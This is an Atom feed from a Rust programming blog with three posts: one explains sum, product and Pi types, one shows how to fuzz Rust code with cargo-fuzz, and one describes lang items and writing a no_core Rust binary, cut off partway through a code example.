<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Rust | In Pursuit of Laziness]]></title>
  <link href="http://manishearth.github.io/blog/categories/rust/atom.xml" rel="self"/>
  <link href="http://manishearth.github.io/"/>
  <updated>2017-03-04T19:58:36-08:00</updated>
  <id>http://manishearth.github.io/</id>
  <author>
    <name><![CDATA[Manish Goregaokar]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[What Are Sum, Product, and Pi Types?]]></title>
    <link href="http://manishearth.github.io/blog/2017/03/04/what-are-sum-product-and-pi-types/"/>
    <updated>2017-03-04T18:52:00-08:00</updated>
    <id>http://manishearth.github.io/blog/2017/03/04/what-are-sum-product-and-pi-types</id>
    <content type="html"><![CDATA[<p><em>See also: <a href="https://tonyarcieri.com/a-quick-tour-of-rusts-type-system-part-1-sum-types-a-k-a-tagged-unions">Tony&rsquo;s post on the same topic</a></em></p>

<p>You often hear people saying &ldquo;Language X<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> has sum types&rdquo; or &ldquo;I wish language X had sum types&rdquo;<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>,
or &ldquo;Sum types are cool&rdquo;.</p>

<p>Much like fezzes and bow ties, sum types are indeed cool.</p>

<p><img class="center" src="/images/post/memes/sum-types-are-cool.jpg" width="400"></p>

<p>These days, I&rsquo;ve also seen people asking about &ldquo;Pi types&rdquo;, because of <a href="https://github.com/ticki/rfcs/blob/pi-types-2/text/0000-pi-types.md">this Rust RFC</a>.</p>

<p>But what does &ldquo;sum type&rdquo; mean? And why is it called that? And what, in the name of sanity, is
a Pi type?</p>

<p>Before I start, I&rsquo;ll mention that while I will be covering some type theory to explain the names
&ldquo;sum&rdquo; and &ldquo;product&rdquo;, you don&rsquo;t need to understand these names to use these things! Far too often
do people have trouble understanding relatively straightforward concepts in languages because
they have confusing names with confusing mathematical backgrounds<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>.</p>

<h2>So what&rsquo;s a sum type? (the no-type-theory version)</h2>

<p>In it&rsquo;s essence, a sum type is basically an &ldquo;or&rdquo; type. Let&rsquo;s first look at structs.</p>

<pre><code class="rust">struct Foo {
    x: bool,
    y: String,
}
</code></pre>

<p><code>Foo</code> is a <code>bool</code> AND a <code>String</code>. You need one of each to make one.
This is an &ldquo;and&rdquo; type, or a &ldquo;product&rdquo; type (I&rsquo;ll explain the name later).</p>

<p>So what would an &ldquo;or&rdquo; type be? It would be one where the value can be a
<code>bool</code> OR a <code>String</code>. You can achieve this with C++ with a union:</p>

<pre><code class="cpp">union Foo {
    bool x;
    string y;
}

foo.x = true; // set it to a bool
foo.y = "blah"; // set it to a string
</code></pre>

<p>However, this isn&rsquo;t <em>exactly</em> right, since the value doesn&rsquo;t store the information
of which variant it is. You could store <code>false</code> and the reader wouldn&rsquo;t know
if you had stored an empty <code>string</code> or a <code>false</code> <code>bool</code>.</p>

<p>There&rsquo;s a pattern called &ldquo;tagged union&rdquo; (or &ldquo;discriminated union&rdquo;) in C++ which bridges this gap.</p>

<pre><code class="cpp">union FooUnion {
    bool x;
    string y;
}

enum FooTag {
    BOOL, STRING
}

struct Foo {
    FooUnion data;
    FooTag tag;
}

// set it to a bool
foo.data.x = true;
foo.tag = BOOL;

// set it to a string
foo.data.y = "blah";
foo.tag = STRING;
</code></pre>

<p>Here, you manually set the tag when setting the value. C++ also has <code>std::variant</code> (or
<code>boost::variant</code>) that encapsulates this pattern with a better API.</p>

<p>While I&rsquo;m calling these &ldquo;or&rdquo; types here, the technical term for such types is &ldquo;sum&rdquo; types.
Other languages have built-in sum types.</p>

<p>Rust has them and calls them &ldquo;enums&rdquo;. These are a more generalized version of the
enums you see in other languages.</p>

<pre><code class="rust">enum Foo {
    Str(String),
    Bool(bool)
}

let foo = Foo::Bool(true);

// "pattern matching"
match foo {
    Str(s) =&gt; /* do something with string `s` */,
    Bool(b) =&gt; /* do something with bool `b` */,
}
</code></pre>

<p>Swift is similar, and also calls them enums
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='swift'><span class='line'><span class="k">enum</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">case</span> <span class="n">str</span><span class="p">(</span><span class="n">String</span><span class="p">)</span>
</span><span class='line'>    <span class="k">case</span> <span class="n">boolean</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">let</span> <span class="n">foo</span> <span class="o">=</span> <span class="n">Foo</span><span class="p">.</span><span class="n">boolean</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>
</span><span class='line'><span class="k">switch</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">case</span> <span class="p">.</span><span class="n">str</span><span class="p">(</span><span class="k">let</span> <span class="n">s</span><span class="p">)</span><span class="o">:</span>
</span><span class='line'>        <span class="c1">// do something with string &lt;code&gt;s&lt;/code&gt;</span>
</span><span class='line'>    <span class="k">case</span> <span class="p">.</span><span class="n">boolean</span><span class="p">(</span><span class="k">let</span> <span class="n">b</span><span class="p">)</span><span class="o">:</span>
</span><span class='line'>        <span class="c1">// do something with boolean &lt;code&gt;b&lt;/code&gt;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>You can fake these in Go using interfaces, as well. Typescript has built-in
unions which can be typechecked without any special effort, but you need
to add a tag (like in C++) to pattern match on them.</p>

<p>Of course, Haskell has them:</p>

<pre><code class="haskell">data Foo = B Bool | S String

-- define a function
doThing :: Foo -&gt; SomeReturnType
doThing (B b) = -- do something with boolean b
doThing (S s) = -- do something with string s

-- call it
doThing (S "blah")
doThing (B True)
</code></pre>

<p>One of the very common things that languages with sum types do is express nullability
as a sum type;</p>

<pre><code class="rust">// an Option is either "something", containing a type, or "nothing"
enum Option&lt;T&gt; {
    Some(T),
    None
}

let x = Some("hello");
match x {
    Some(s) =&gt; println!("{}", s),
    None =&gt; println!("no string for you"),
}
</code></pre>

<p>Generally, these languages have &ldquo;pattern matching&rdquo;, which is like a <code>switch</code>
statement on steroids. It lets you match on and destructure all kinds of things,
sum types being one of them. Usually, these are &ldquo;exhaustive&rdquo;, which means that
you are forced to handle all possible cases. In Rust, if you remove that <code>None</code>
branch, the program won&rsquo;t compile. So you&rsquo;re forced to deal with the none case,
<em>somehow</em>.</p>

<p>In general sum types are a pretty neat and powerful tool. Languages with them built-in
tend to make heavy use of them, almost as much as they use structs.</p>

<h2>Why do we call it a sum type?</h2>

<p><em>Here be (type theory) <a href="https://en.wikipedia.org/wiki/Compilers:_Principles,_Techniques,_and_Tools">dragons</a></em></p>

<p>Let&rsquo;s step back a bit and figure out what a type is.</p>

<p>It&rsquo;s really a restriction on the values allowed. It can have things like methods and whatnot
dangling off it, but that&rsquo;s not so important here.</p>

<p></p>

<p>In other words, it&rsquo;s a <a href="https://en.wikipedia.org/wiki/Set_(mathematics)">set</a>. A boolean is the set &#92;(\{\mathtt{true}, \mathtt{false}\}&#92;). An 8-bit unsigned integer
(<code>u8</code> in Rust) is the set &#92;(\{0, 1, 2, 3, &hellip;. 254, 255\}&#92;). A string is a set with
infinite elements, containing all possible valid strings<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup>.</p>

<p>What&rsquo;s a struct? A struct with two fields contains every possible combination of elements from the two sets.</p>

<pre><code class="rust">struct Foo {
    x: bool,
    y: u8,
}
</code></pre>

<p>The set of possible values of <code>Foo</code> is</p>

<p>&#92;[\{(\mathtt{x}, \mathtt{y}): \mathtt{x} \in \mathtt{bool}, \mathtt y \in \mathtt{u8}\}&#92;]</p>

<p>(Read as &ldquo;The set of all &#92;((\mathtt{x}, \mathtt{y})&#92;) where &#92;(\tt x&#92;) is in &#92;(\mathtt{bool}&#92;) and &#92;(\tt y&#92;) is in &#92;(\mathtt{u8}&#92;)&rdquo;)</p>

<p>This is called a <em>Cartesian product</em>, and is often represented as &#92;(\tt Foo = bool \times u8&#92;).
An easy way to view this as a product is to count the possible values: The number of possible values
of <code>Foo</code> is the number of possible values of <code>bool</code> (2) <em>times</em> the number of possible values of <code>u8</code> (256).</p>

<p>A general struct would be a &ldquo;product&rdquo; of the types of each field, so something like</p>

<pre><code class="rust">struct Bar {
    x: bool,
    y: u8,
    z: bool,
    w: String
}
</code></pre>

<p>is &#92;(\mathtt{Bar = bool \times u8 \times bool \times String}&#92;)</p>

<p>This is why structs are called &ldquo;product types&rdquo;<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>.</p>

<p>You can probably guess what comes next &ndash; Rust/Swift enums are &ldquo;sum types&rdquo;, because they are the
<em>sum</em> of the two sets.</p>

<pre><code class="rust">enum Foo {
    Bool(bool),
    Integer(u8),
}
</code></pre>

<p>is a set of all values which are valid booleans, <em>and</em> all values which are valid integers. This
is a sum of sets, &#92;(\tt Foo = bool + u8&#92;). More accurately, it&rsquo;s a <em>disjoint union</em>, where if the input
sets have overlap, the overlap is &ldquo;discriminated&rdquo; out.</p>

<p>An example of this being a disjoint union is:</p>

<pre><code class="rust">enum Bar {
    Bool1(bool),
    Bool2(bool),
    Integer(u8).
}
</code></pre>

<p>This is not &#92;(\tt Bar = bool + bool + u8&#92;), because &#92;(\tt bool + bool = bool&#92;), (regular set addition doesn&rsquo;t duplicate the overlap).</p>

<p>Instead, it&rsquo;s something like</p>

<p>&#92;[\tt Bar = bool + otherbool + u8&#92;]</p>

<p>where &#92;(\tt otherbool&#92;) is also a set &#92;(\tt \{true, false\}&#92;),
except that these elements are <em>different</em> from those in &#92;(\tt bool&#92;). You can look at it as if</p>

<p>&#92;[\tt otherbool = \{true_2, false_2\}&#92;]</p>

<p>so that</p>

<p>&#92;[\mathtt{bool + otherbool} = \{\mathtt{true, false, true_2, false_2}\}&#92;]</p>

<p>For sum types, the number of possible values is the sum of the number of possible values of
each of its component types.</p>

<p>So, Rust/Swift enums are &ldquo;sum types&rdquo;.</p>

<p>You may often notice the terminology &ldquo;algebraic datatypes&rdquo; (ADT) being used, usually that&rsquo;s just
talking about sum and product types together &ndash; a language with ADTs will have both.</p>

<p>In fact, you can even have <em>exponential</em> types! The notation A<sup>B</sup> in set theory does mean something,
it&rsquo;s the set of all possible mappings from &#92;(B&#92;) to &#92;(A&#92;). The number of elements is &#92;(N_A^{N_B}&#92;). So
basically, a function (which is a mapping) is an &ldquo;exponential&rdquo; type. You can also view it as
an iterated product type, a function from type <code>B</code> to <code>A</code> is really a struct like this:</p>

<pre><code class="rust">fn my_func(b: B) -&gt; A {...}

// is conceptually

struct my_func {
    b1: A, // value for first element in B
    b2: A, // value for second element in B
    b3: A,
    // ... 
}
</code></pre>

<p>given a value of the input <code>b</code>, the function will find the right field of <code>my_func</code> and return
the mapping. Since a struct is a product type, this is</p>

<p>&#92;[\mathtt{A}^{N_\mathtt{B}} = \tt A \times A \times A \times \dots&#92;]</p>

<p>making it an exponential type.</p>

<p><a href="http://strictlypositive.org/diff.pdf">You can even take <em>derivatives</em> of types!</a> (h/t Sam Tobin-Hochstadt for pointing this out to me)</p>

<p></p>

<h2>What, in the name of sanity, is a Pi type?</h2>

<p><img class="center" src="/images/post/memes/what-in-the-name-of-sanity.jpg" width="400"></p>

<p>It&rsquo;s essentially a form of dependent type. A dependent type is when your type
can depend on a value. An example of this is integer generics, where you
can do things like <code>Array&lt;bool, 5&gt;</code>, or <code>template&lt;unsigned int N, typename T&gt; Array&lt;T, N&gt; ...</code> (in C++).</p>

<p>The name comes from how a constructor for these types would look:</p>

<pre><code class="rust">// create an array of booleans from a given integer
// I made up this syntax, this is _not_ from the Rust Pi type RFC
fn make_array(x: u8) -&gt; Array&lt;bool, x&gt; {
    // ...
}

// or
// (the proposed rust syntax)
fn make_array&lt;const x: u8&gt;() -&gt; Array&lt;bool, x&gt; {
   // ... 
}
</code></pre>

<p>What&rsquo;s the type of <code>make_array</code> here? It&rsquo;s a function which can accept any integer
and return a different type in each case. You can view it as a set of functions,
where each function corresponds to a different integer input. It&rsquo;s basically:</p>

<pre><code class="rust">struct make_array {
    make_array_0: fn() -&gt; Array&lt;bool, 0&gt;,
    make_array_1: fn() -&gt; Array&lt;bool, 1&gt;,
    make_array_2: fn() -&gt; Array&lt;bool, 2&gt;,
    make_array_3: fn() -&gt; Array&lt;bool, 3&gt;,
    make_array_4: fn() -&gt; Array&lt;bool, 4&gt;,
    make_array_5: fn() -&gt; Array&lt;bool, 5&gt;,
    // ... 
}
</code></pre>

<p>Given an input, the function chooses the right child function here, and calls it.</p>

<p></p>

<p>This is a struct, or a product type! But it&rsquo;s a product of an infinite number of types<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup>.</p>

<p>We can look at it as</p>

<p>&#92;[\texttt{make_array} = \prod\limits_{x = 0}^\infty\left( \texttt{fn()} \mathtt\to \texttt{Array&lt;bool, x&gt;}\right)&#92;]</p>

<p>The usage of the &#92;(\Pi&#92;) symbol to denote an iterative product gives this the name &ldquo;Pi type&rdquo;.</p>

<p>In languages with lazy evaluation (like Haskell), there is no difference between having a function
that can give you a value, and actually having the value. So, the type of <code>make_array</code> is the type
of <code>Array&lt;bool, N&gt;</code> itself in languages with lazy evaluation.</p>

<p>There&rsquo;s also a notion of a &ldquo;sigma&rdquo; type, which is basically</p>

<p>&#92;[\sum\limits_{x = 0}^\infty \left(\texttt{fn()} \mathtt\to \texttt{Array&lt;bool, x&gt;}\right)&#92;]</p>

<p>With the Pi type, we had &ldquo;for all N we can
construct an array&rdquo;, with the sigma type we have &ldquo;there exists some N for which we can construct this array&rdquo;.
As you can expect, this type can be expressed with a possibly-infinite enum, and instances of this type
are basically instances of <code>Array&lt;bool, N&gt;</code> for some specific <code>N</code> where the <code>N</code> is only known at runtime.
(much like how regular sum types are instances of one amongst multiple types, where the exact type
is only known at runtime). <code>Vec&lt;bool&gt;</code> is conceptually similar to the sigma type <code>Array&lt;bool, ?&gt;</code>.</p>

<p></p>

<h2>Wrapping up</h2>

<p>Types are sets, and we can do set-theory things on them to make cooler types.</p>

<p>Let&rsquo;s try to avoid using confusing terminology, however. If Rust <em>does</em> get &ldquo;pi types&rdquo;,
let&rsquo;s just call them &ldquo;dependent types&rdquo; or &ldquo;integer generics&rdquo; :)</p>

<p><em>Thanks to Zaki, Avi Weinstock, Corey Richardson, and Peter Atashian for reviewing drafts of this post.</em></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Rust, Swift, <em>sort of</em> Typescript, and all the functional languages who had it before it was cool.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>Lookin&#8217; at you, Go.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>Moooooooooooooooonads<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>Though you can argue that strings often have their length bounded by the pointer size of the platform, so it&rsquo;s still a finite set.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>This even holds for zero-sized types, for more examples, check out <a href="http://chris-taylor.github.io/blog/2013/02/10/the-algebra-of-algebraic-data-types/">this blog post</a><a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
<li id="fn:6">
<p>Like with strings, in practice this would probably be bounded by the integer type chosen<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mitigating Underhandedness: Fuzzing Your Code]]></title>
    <link href="http://manishearth.github.io/blog/2017/03/02/mitigating-underhandedness-fuzzing-your-code/"/>
    <updated>2017-03-02T16:13:54-08:00</updated>
    <id>http://manishearth.github.io/blog/2017/03/02/mitigating-underhandedness-fuzzing-your-code</id>
    <content type="html"><![CDATA[<p><em>This may be part of a collaborative blog post series about underhanded Rust code. Or it may not. I invite you to write your own posts about underhanded code to make it so!</em></p>

<p>The <a href="https://underhanded.rs/blog/2017/02/28/extending-submission-deadline.en-US.html">submission deadline for the Underhanded Rust competition has been extended</a>, so
let&rsquo;s talk more about how to keep your code working and free from bugs/underhandedness!</p>

<p><a href="http://manishearth.github.io/blog/2017/01/21/mitigating-underhandedness-clippy/">Previously, we talked about Clippy</a>.</p>

<p>Now, really, underhanded bugs are just another form of bug. And how do we find bugs? We test!</p>

<p>We write unit tests. We run the code under Valgrind, ASan, MSan, UBSan, TSan, and any other sanitizer
we can get our hands on. Tests tests tests. More tests. Tests.</p>

<p>But, there&rsquo;s a problem here. You need to write <em>test cases</em> to make this work. These are inputs
fed to your code after which you check whatever invariants your code has. There&rsquo;s
no guarantee that the test cases you write will exercise all the code paths in your
program. This applies for sanitizers too, sanitizers are limited to testing the code paths
that your test cases hit.</p>

<p>Of course, you can use code coverage tools to ensure that all these code paths will be hit.
However, there&rsquo;s a conflict here &ndash; your code will have many code paths that are
<em>not supposed to be hit ever</em>. Things like redundant bounds checks, null checks, etc.
In Rust programs such code paths generally use panics.</p>

<p>Now, these code paths are never <em>supposed</em> to be hit, so they&rsquo;ll never show up in your
code coverage. But you don&rsquo;t have a guarantee that they can never be hit, short
of formally verifying your program. The only solution here is writing more test cases.</p>

<p>Aside from that, even ignoring those code paths, you still need to manually write
test cases for everything. For each possible code path in your code, if you want to
be sure.</p>

<p>Who wants to manually write a million test cases?</p>

<p><img class="center" src="/images/post/memes/aint-nobody.jpg" width="400"></p>

<p><img class="center" src="/images/post/memes/that-would-be-great.jpg" width="400"></p>

<p>Enter fuzzing. What fuzzing will do is feed your program random inputs, carefully watching the
codepaths being taken, and try to massage the inputs so that new, interesting (usually crashy)
codepaths are taken. You write tests for the fuzzer such that they can accept arbitrary input, and
the fuzzer will find cases where they crash or panic.</p>

<p>One of the most popular fuzzers out there is <a href="http://lcamtuf.coredump.cx/afl/">AFL</a>, which takes a binary and feeds it random
input. Rust <a href="https://github.com/rust-fuzz/afl.rs">has a library that you can use for running AFL</a>, however it currently needs
to be run via a Docker image or needs a recompilation of rustc, since it adds a custom LLVM pass.
We&rsquo;re working on making this step unnecessary.</p>

<p>However, as of a few weeks ago, we now have bindings for <a href="http://llvm.org/docs/LibFuzzer.html">libFuzzer</a>, which uses existing
instrumentation options built in to LLVM itself! libFuzzer works a bit differently; instead
of giving it a binary, you write a function in a special way and give it a library containing
that function, which it turns into a fuzzer binary. This is faster, since the fuzzer lives
inside the binary itself and it doesn&rsquo;t need to execute a new program each time.</p>

<p>Using libFuzzer in Rust is easy. Install <a href="https://github.com/rust-fuzz/cargo-fuzz"><code>cargo-fuzz</code></a>:</p>

<pre><code class="sh">$ cargo install cargo-fuzz
</code></pre>

<p>Now, within your crate, initialize the fuzz setup:</p>

<pre><code class="sh">$ cargo fuzz --init
</code></pre>

<p>This will create a fuzzing crate in <code>fuzz/</code>, with a single &ldquo;fuzz target&rdquo;, <code>fuzzer_script_1</code>.
You can add more such targets with <code>cargo fuzz --add name_of_target</code>. Fuzz targets are small libraries
with a single function in them; the function that will be called over and over again by the fuzzer.
It is up to you to fill in the body of this function, such that the program will crash or panic
if and only if something goes wrong.</p>

<p>For example, for the <code>unicode-segmentation</code> crate, <a href="https://github.com/Manishearth/unicode-segmentation/blob/99b3636ef6b4d96c05644403c1c2eccba2c5f5db/fuzz/fuzzers/equality.rs">one of the fuzz targets I wrote</a> just
takes the string, splits it by grapheme and word boundaries, recombines it, and then asserts that
the new string is the same.</p>

<pre><code class="rust">pub extern fn go(data: &amp;[u8]) {
    // we only deal with unicode input
    // bail early, *without panicking* if the input isn't utf8
    if let Ok(s) = str::from_utf8(data) {
        // split into graphemes, recollect
        let result = UnicodeSegmentation::graphemes(s, true).flat_map(|s| s.chars()).collect::&lt;String&gt;();
        // recollected string should be the same as the input, panic if not
        assert_eq!(s, result);

        // split into words, recollect
        let result = s.split_word_bounds().flat_map(|s| s.chars()).collect::&lt;String&gt;();
        // recollected string should be the same as the input, panic if not
        assert_eq!(s, result);
    }
}
</code></pre>

<p>The other targets ensure that the forward and reverse word/grapheme
iterators produce the same results. They all take the byte slice input, attempt to convert to UTF8
(silently failing  &ndash; NOT panicking &ndash; if not possible), and then use the string as an input
testcase.</p>

<p>Now, these targets will panic if the test fails, and the fuzzer will try and force that panic to
happen. But also, these targets put together exercise most of the API surface of the crate, so
the fuzzer may also find panics (or even segmentation faults!) in the crate itself. For example,
the <a href="https://github.com/servo/rust-url/blob/3e5541e51e02d8acb10a6ea8ab174ba1bc23ce41/fuzz/fuzzers/parse.rs#L10">fuzz target for rust-url</a> doesn&rsquo;t itself assert; all it does is try to parse the given
string. The fuzzer will try to get the URL parser to panic.</p>

<p>To run a fuzz script:</p>

<pre><code class="sh">$ cargo fuzz --fuzz-target fuzzer_script_1
</code></pre>

<p>This will start the fuzzer, running until it finds a crash or panic. It may also
find other things like inputs which make the code abnormally slow.</p>

<p>Fuzzing can find some interesting bugs. For example, the unicode-segmentation
fuzzers found <a href="https://github.com/unicode-rs/unicode-segmentation/issues/19">this bug</a>, where an emoji followed by <em>two</em> skin tone modifiers
isn&rsquo;t handled correctly. We&rsquo;d probably never have been able to come up with this testcase on our
own. But the fuzzer could find it!</p>

<p>The Rust Cap&#8217;n Proto crate ran cargo-fuzz and found <a href="https://dwrensha.github.io/capnproto-rust/2017/02/27/cargo-fuzz.html">a whole ton of bugs</a>. There
are more such examples <a href="https://github.com/rust-fuzz/cargo-fuzz#trophy-case">in the trophy case</a> (be sure to add any of your own findings
to the trophy case, too!)</p>

<p>cargo-fuzz is relatively new, so the API and behavior may still be tweaked a bit before 1.0.
But you can start taking it for a spin now, and finding bugs!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Rust Tidbits: What Is a Lang Item?]]></title>
    <link href="http://manishearth.github.io/blog/2017/01/11/rust-tidbits-what-is-a-lang-item/"/>
    <updated>2017-01-11T21:01:13-08:00</updated>
    <id>http://manishearth.github.io/blog/2017/01/11/rust-tidbits-what-is-a-lang-item</id>
    <content type="html"><![CDATA[<p><em>Rust is not a simple language. As with any such language, it has many little tidbits of complexity
that most folks aren&rsquo;t aware of. Many of these tidbits are ones which may not practically matter
much for everyday Rust programming, but are interesting to know. Others may be more useful. I&rsquo;ve
found that a lot of these aren&rsquo;t documented anywhere (not that they always should be), and sometimes
depend on knowledge of compiler internals or history. As a fan of programming trivia myself, I&rsquo;ve
decided to try writing about these things whenever I come across them. &ldquo;Tribal Knowledge&rdquo; shouldn&rsquo;t
be a thing in a programming community; and trivia is fun!</em></p>

<p>Previously in tidbits: <a href="http://manishearth.github.io/blog/2017/01/10/rust-tidbits-box-is-special/"><code>Box</code> is Special</a></p>

<p>Last time I talked about <code>Box&lt;T&gt;</code> and how it is a special snowflake. Corey <a href="https://www.reddit.com/r/rust/comments/5nb86x/rust_tidbits_box_is_special/dca4y6n/?utm_content=permalink&amp;utm_medium=front&amp;utm_source=reddit&amp;utm_name=rust">asked</a> that
I write more about lang items, which are basically all of the special snowflakes in the stdlib.</p>

<p>So what <em>is</em> a lang item? Lang items are a way for the stdlib (and libcore) to define types, traits,
functions, and other items which the compiler needs to know about.</p>

<p>For example, when you write <code>x + y</code>, the compiler will effectively desugar that into
<code>Add::add(x, y)</code><sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. How did it know what trait to call? Did it just insert a call to
<code>::core::Add::add</code> and hope the trait was defined there? This is what C++ does;
the Itanium ABI spec expects functions of certain names
to just <em>exist</em>, which the compiler is supposed to call in various cases. The
<code>__cxa_guard_*</code> functions from C++s deferred-initialization local statics (which
I&rsquo;ve <a href="http://manishearth.github.io/blog/2015/06/26/adventures-in-systems-programming-c-plus-plus-local-statics/">explored in the past</a>) are an example of this. You&rsquo;ll find that the spec is
full of similar <code>__cxa</code> functions. While the spec just expects certain types,
e.g. <code>std::type_traits</code> (&ldquo;Type properties&rdquo; § 20.10.4.3), to be magic and exist in certain locations,
the compilers seem to implement them using intrinsics like <code>__is_trivial&lt;T&gt;</code> which aren&rsquo;t defined
in C++ code at all. So C++ compilers have a mix of solutions here, they partly insert calls
to known ABI functions, and they partly implement &ldquo;special&rdquo; types via intrinsics which
are detected and magicked when the compiler comes across them.</p>

<p>However, this is not Rust&rsquo;s solution. It does not care what the <code>Add</code> trait is named or where it is
placed. Instead, it knew where the trait for addition was located because <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/ops.rs#L243"><em>we told it</em></a>.
When you put <code>#[lang = "add"]</code> on a trait, the compiler knows to call <code>YourTrait::add(x, y)</code> when it
encounters the addition operator. Of course, usually the compiler will already have been told about
such a trait since libcore is usually the first library in the pipeline. If you want to actually use
this, you need to <em>replace libcore</em>.</p>

<p>Huh? You can&rsquo;t do that, can you?</p>

<p>It&rsquo;s not a big secret that you can compile rust without the stdlib using
<a href="https://doc.rust-lang.org/book/no-stdlib.html"><code>#![no_std]</code></a>. This is useful in cases when you are on an embedded system and can&rsquo;t
rely on an allocator existing. It&rsquo;s also useful for writing your own alternate stdlib, though
that&rsquo;s not something folks do often. Of course, libstd itself <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libstd/lib.rs#L213-L214">uses <code>#![no_std]</code></a>,
because without it the compiler will happily inject an <code>extern crate std</code> while trying to compile
libstd and the universe will implode.</p>

<p>What&rsquo;s less known is that you can do the same thing with libcore, via <code>#![no_core]</code>. And, of course,
libcore <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/lib.rs#L65">uses it</a> to avoid the cyclic dependency. Unlike <code>#![no_std]</code>, <code>no_core</code> is
a nightly-only feature that we may never stabilize<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. <code>#![no_core]</code> is something that&rsquo;s basically
only to be used if you <em>are</em> libcore (or you are an alternate Rust stdlib/core implementation
trying to emulate it).</p>

<p>Still, it&rsquo;s possible to write a working Rust binary in <code>no_core</code> mode:</p>

<pre><code class="rust">#![feature(no_core)]
#![feature(lang_items)]

// Look at me.
// Look at me.
// I'm the libcore now.
#![no_core]

// Tell the compiler to link to appropriate runtime libs
// (This way I don't have to specify `-l` flags explicitly)
#[cfg(target_os = "linux")]
#[link(name = "c")]
extern {}
#[cfg(target_os = "macos")]
#[link(name = "System")]
extern {}

// Compiler needs these to proceed
#[lang = "sized"]
pub trait Sized {}
#[lang = "copy"]
pub trait Copy {}

// `main` isn't the actual entry point, `start` is.
#[lang = "start"]
fn start(_main: *const u8, _argc: isize, _argv: *const *const u8) -&gt; isize {
    // we can't really do much in this benighted hellhole of
    // an environment without bringing in more libraries.
    // We can make syscalls, segfault, and set the exit code.
    // To be sure that this actually ran, let's set the exit code.
    42
}

// still need a main unless we want to use `#![no_main]`
// won't actually get called; `start()` is supposed to call it
fn main() {}
</code></pre>

<p>If you run this, the program will exit with exit code 42.</p>

<p>Note that this already adds two lang items. <code>Sized</code> and <code>Copy</code>. It&rsquo;s usually worth
<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/marker.rs#L88-L94">looking at the lang item in libcore</a> and copying it over unless you want to make
tweaks. Beware that tweaks may not always work; not only does the compiler expect the lang item
to exist, it expects it to make sense. There are properties of the lang item that it assumes
are true, and it may cause assertions in the code. In this case I do have a tweak, since
the original definition of <code>Copy</code> is <code>pub trait Copy: Clone {}</code>, but I know that this tweak
will work.</p>

<p>Lang items are usually only required when you do an operation which needs them. There are 72 non-
deprecated lang items and we only had to define three of them here. &ldquo;start&rdquo; is necessary to, well,
start executables, and <code>Copy</code>/<code>Sized</code> are very crucial to how the compiler reasons about types and
must exist.</p>

<p>But let&rsquo;s try doing something that will trigger a lang item to be required:</p>

<pre><code class="rust">pub static X: u8 = 1;
</code></pre>

<p>Rust will immediately complain:</p>

<pre><code>$ rustc test.rs
error: requires `sync` lang_item
</code></pre>

<p>This is because Rust wants to enforce that types in statics (which can be accessed concurrently)
are safe when accessed concurrently, i.e., they implement <code>Sync</code>. We haven&rsquo;t defined <code>Sync</code> yet,
so Rust doesn&rsquo;t know how to enforce this restruction. The <code>Sync</code> trait is defined with the &ldquo;sync&rdquo;
lang item, so we need to do:</p>

<pre><code class="rust">pub static X: u8 = 1;

#[lang = "sync"]
pub unsafe trait Sync {}
unsafe impl Sync for u8 {}
</code></pre>

<p>Note that the trait doesn&rsquo;t have to be called <code>Sync</code> here, any trait name would work. This
definition is also a slight <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/marker.rs#L343-L351">departure from the one in the stdlib</a>, and in general you
should include the auto trait impl (instead of specifically using <code>unsafe impl Sync for u8 {}</code>)
since the compiler may assume it exists. Our code is small enough for this to not matter.</p>

<p>Alright, let&rsquo;s try defining our own addition trait as before. First, let&rsquo;s see
what happens if we try to add a struct when addition isn&rsquo;t defined:</p>

<pre><code class="rust">struct Foo;
#[lang = "start"]
fn start(_main: *const u8, _argc: isize, _argv: *const *const u8) -&gt; isize {
